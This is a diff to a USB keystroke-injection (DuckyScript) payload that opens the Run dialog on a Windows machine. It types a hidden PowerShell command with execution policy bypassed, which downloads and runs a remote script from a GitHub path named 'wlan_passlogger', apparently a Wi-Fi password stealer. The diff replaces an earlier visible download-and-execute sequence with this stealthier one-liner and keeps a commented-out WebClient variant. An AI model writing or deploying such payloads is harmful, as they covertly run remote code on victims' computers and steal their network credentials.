@@ -1,13 +1,10 @@
+DEFINE #SCRIPTURL https://raw.githubusercontent.com/castrosp/payloads/refs/heads/main/wlan_passlogger/option2/script.ps1
 
 GUI r
 DELAY 500
-STRING powershell
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr #SCRIPTURL?dl=1; invoke-expression $pl
+DELAY 50000
 ENTER
-DELAY 1000
 
-STRING $gitUrl = "https://raw.githubusercontent.com/castrosp/payloads/refs/heads/main/wlan_passlogger/option2/script.ps1"
-DELAY 200
-ENTER
-STRING Invoke-RestMethod -Uri $gitUrl | Invoke-Expression
-DELAY 200
-ENTER
+
+REM Invoke-Expression ((New-Object System.net.WebClient).DownloadString('https://raw.githubusercontent.com/castrosp/payloads/refs/heads/main/wlan_passlogger/option2/script.ps1'))
